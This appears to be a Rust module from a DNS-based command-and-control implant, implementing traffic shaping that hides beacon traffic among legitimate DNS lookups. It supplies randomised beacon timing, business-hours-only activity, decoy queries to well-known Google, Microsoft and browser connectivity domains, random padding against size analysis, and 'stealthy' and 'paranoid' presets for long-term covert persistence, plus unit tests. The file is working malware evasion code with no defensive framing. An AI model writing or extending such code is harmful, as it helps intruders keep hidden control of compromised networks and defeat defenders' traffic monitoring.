//! Traffic shaping and timing obfuscation.
//!
//! Makes C2 traffic patterns indistinguishable from legitimate DNS traffic
//! by controlling timing, volume, and packet characteristics.

use rand::Rng;
use serde::{Deserialize, Serialize};

/// Traffic shaping profile
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrafficProfile {
    /// Base interval between queries (seconds)
    pub base_interval_secs: f64,
    /// Jitter distribution type
    pub jitter: JitterType,
    /// Maximum queries per minute (rate limiting)
    pub max_qpm: u32,
    /// Working hours only (blend with business traffic)
    pub working_hours: Option<WorkingHours>,
    /// Add decoy DNS queries between real C2 queries
    pub decoy_ratio: f64,
    /// Decoy domains to query (should be popular legitimate domains)
    pub decoy_domains: Vec<String>,
    /// Packet size normalization
    pub normalize_sizes: bool,
    /// Target packet size for normalization (bytes)
    pub target_size: usize,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum JitterType {
    /// Uniform random: base ± jitter_range
    Uniform { range_secs: f64 },
    /// Gaussian/normal distribution: mean=base, stddev=sigma
    Gaussian { sigma_secs: f64 },
    /// Exponential distribution (mimics Poisson process — very realistic)
    Exponential { lambda: f64 },
    /// No jitter (fixed interval — easily fingerprinted, avoid)
    None,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkingHours {
    /// Start hour (0-23, local time)
    pub start_hour: u8,
    /// End hour (0-23, local time)
    pub end_hour: u8,
    /// Days active (0=Sun, 1=Mon, ..., 6=Sat)
    pub active_days: Vec<u8>,
    /// Reduced activity outside hours (fraction, e.g., 0.1 = 10% of normal rate)
    pub off_hours_fraction: f64,
}

impl Default for TrafficProfile {
    fn default() -> Self {
        Self {
            base_interval_secs: 30.0,
            jitter: JitterType::Exponential { lambda: 0.033 }, // ~30s mean
            max_qpm: 10,
            working_hours: Some(WorkingHours {
                start_hour: 8,
                end_hour: 18,
                active_days: vec![1, 2, 3, 4, 5], // Mon-Fri
                off_hours_fraction: 0.1,
            }),
            decoy_ratio: 3.0, // 3 decoy queries per real query
            decoy_domains: default_decoy_domains(),
            normalize_sizes: true,
            target_size: 512,
        }
    }
}

fn default_decoy_domains() -> Vec<String> {
    vec![
        "www.google.com".into(),
        "www.microsoft.com".into(),
        "ocsp.digicert.com".into(),
        "connectivity-check.ubuntu.com".into(),
        "dns.msftncsi.com".into(),
        "www.gstatic.com".into(),
        "clientservices.googleapis.com".into(),
        "update.googleapis.com".into(),
        "detectportal.firefox.com".into(),
        "prod.do.dsp.mp.microsoft.com".into(),
    ]
}

impl TrafficProfile {
    /// Calculate the next sleep duration based on the jitter profile
    pub fn next_sleep_duration(&self) -> std::time::Duration {
        let mut rng = rand::thread_rng();
        let secs = match self.jitter {
            JitterType::Uniform { range_secs } => {
                self.base_interval_secs + rng.gen_range(-range_secs..range_secs)
            }
            JitterType::Gaussian { sigma_secs } => {
                // Box-Muller transform for normal distribution
                let u1: f64 = rng.gen_range(0.0001..1.0);
                let u2: f64 = rng.gen_range(0.0001..1.0);
                let z = (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos();
                self.base_interval_secs + z * sigma_secs
            }
            JitterType::Exponential { lambda } => {
                // Inverse CDF: -ln(U)/lambda
                let u: f64 = rng.gen_range(0.0001..1.0);
                -u.ln() / lambda
            }
            JitterType::None => self.base_interval_secs,
        };

        // Apply working hours modifier
        // Cap off-hours sleep at 1 hour to allow periodic re-check of working hours
        const MAX_OFF_HOURS_SLEEP: f64 = 3600.0;
        let secs = if let Some(wh) = &self.working_hours {
            if !is_working_hours(wh) {
                if wh.off_hours_fraction <= 0.0 {
                    // Fraction of 0 means "completely silent" — sleep for max then re-check
                    MAX_OFF_HOURS_SLEEP
                } else {
                    (secs / wh.off_hours_fraction).min(MAX_OFF_HOURS_SLEEP)
                }
            } else {
                secs
            }
        } else {
            secs
        };

        std::time::Duration::from_secs_f64(secs.max(0.5))
    }

    /// Generate a decoy query schedule.
    /// Returns a list of (delay_ms, domain) pairs for decoy queries
    /// to issue around a real C2 query.
    pub fn generate_decoy_schedule(&self) -> Vec<(u64, String)> {
        let mut rng = rand::thread_rng();
        let n = self.decoy_ratio.round() as usize;
        let mut schedule = Vec::with_capacity(n);

        for _ in 0..n {
            let delay = rng.gen_range(0..5000); // 0-5 seconds
            let domain_idx = rng.gen_range(0..self.decoy_domains.len());
            schedule.push((delay, self.decoy_domains[domain_idx].clone()));
        }

        schedule.sort_by_key(|(delay, _)| *delay);
        schedule
    }

    /// Pad data to the target size for traffic normalization.
    /// Prevents traffic analysis based on payload size patterns.
    pub fn normalize_payload(&self, data: &[u8]) -> Vec<u8> {
        if !self.normalize_sizes || data.len() >= self.target_size {
            return data.to_vec();
        }

        let mut padded = Vec::with_capacity(self.target_size);
        // First 4 bytes: actual data length
        padded.extend_from_slice(&(data.len() as u32).to_le_bytes());
        padded.extend_from_slice(data);
        // Pad with random bytes (avoids zero-padding detection)
        let remaining = self.target_size - padded.len();
        let mut rng = rand::thread_rng();
        for _ in 0..remaining {
            padded.push(rng.gen());
        }
        padded
    }

    /// Remove normalization padding from a payload
    pub fn denormalize_payload(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        if data.len() < 4 {
            return Err("data too short for length prefix".into());
        }
        let actual_len = u32::from_le_bytes(data[..4].try_into().unwrap()) as usize;
        if 4 + actual_len > data.len() {
            return Err(format!("declared length {} exceeds data size {}", actual_len, data.len() - 4));
        }
        Ok(data[4..4 + actual_len].to_vec())
    }

    /// Preset: aggressive (low latency, higher detection risk)
    pub fn aggressive() -> Self {
        Self {
            base_interval_secs: 5.0,
            jitter: JitterType::Uniform { range_secs: 2.0 },
            max_qpm: 30,
            working_hours: None,
            decoy_ratio: 0.0,
            decoy_domains: Vec::new(),
            normalize_sizes: false,
            target_size: 0,
        }
    }

    /// Preset: stealthy (high latency, minimal detection surface)
    pub fn stealthy() -> Self {
        Self {
            base_interval_secs: 300.0, // 5 minutes
            jitter: JitterType::Exponential { lambda: 0.003 }, // ~5min mean
            max_qpm: 2,
            working_hours: Some(WorkingHours {
                start_hour: 9,
                end_hour: 17,
                active_days: vec![1, 2, 3, 4, 5],
                off_hours_fraction: 0.05, // Almost silent outside hours
            }),
            decoy_ratio: 5.0,
            decoy_domains: default_decoy_domains(),
            normalize_sizes: true,
            target_size: 512,
        }
    }

    /// Preset: paranoid (extremely low and slow, for long-term persistence)
    pub fn paranoid() -> Self {
        Self {
            base_interval_secs: 3600.0, // 1 hour
            jitter: JitterType::Exponential { lambda: 0.0003 }, // ~1hr mean
            max_qpm: 1,
            working_hours: Some(WorkingHours {
                start_hour: 10,
                end_hour: 15,
                active_days: vec![2, 3, 4], // Tue-Thu only
                off_hours_fraction: 0.0, // Completely silent
            }),
            decoy_ratio: 10.0,
            decoy_domains: default_decoy_domains(),
            normalize_sizes: true,
            target_size: 256,
        }
    }
}

fn is_working_hours(wh: &WorkingHours) -> bool {
    use std::time::{SystemTime, UNIX_EPOCH};

    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();

    // Simple UTC-based check (production would use local timezone)
    let hour = ((secs % 86400) / 3600) as u8;
    let day = ((secs / 86400 + 4) % 7) as u8; // 0=Sun, epoch was Thursday

    wh.active_days.contains(&day) && hour >= wh.start_hour && hour < wh.end_hour
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_profile() {
        let profile = TrafficProfile::default();
        let duration = profile.next_sleep_duration();
        assert!(duration.as_secs_f64() > 0.0);
    }

    #[test]
    fn test_uniform_jitter() {
        let profile = TrafficProfile {
            base_interval_secs: 10.0,
            jitter: JitterType::Uniform { range_secs: 5.0 },
            ..TrafficProfile::aggressive()
        };
        // Run many iterations — all should be within range
        for _ in 0..100 {
            let d = profile.next_sleep_duration();
            assert!(d.as_secs_f64() >= 0.5); // min clamp
            assert!(d.as_secs_f64() <= 20.0); // 10 + 5 + some margin
        }
    }

    #[test]
    fn test_decoy_schedule() {
        let profile = TrafficProfile::default();
        let schedule = profile.generate_decoy_schedule();
        assert_eq!(schedule.len(), 3); // decoy_ratio = 3.0
        // Schedule should be sorted by delay
        for i in 1..schedule.len() {
            assert!(schedule[i].0 >= schedule[i - 1].0);
        }
    }

    #[test]
    fn test_payload_normalization_roundtrip() {
        let profile = TrafficProfile::default();
        let data = b"short payload";
        let normalized = profile.normalize_payload(data);
        assert_eq!(normalized.len(), 512); // target_size
        let denormalized = profile.denormalize_payload(&normalized).unwrap();
        assert_eq!(&denormalized, data);
    }

    #[test]
    fn test_stealthy_profile() {
        let profile = TrafficProfile::stealthy();
        assert_eq!(profile.base_interval_secs, 300.0);
        assert_eq!(profile.decoy_ratio, 5.0);
        assert!(profile.normalize_sizes);
    }

    #[test]
    fn test_paranoid_profile() {
        let profile = TrafficProfile::paranoid();
        assert_eq!(profile.base_interval_secs, 3600.0);
        assert_eq!(profile.decoy_ratio, 10.0);
    }
}
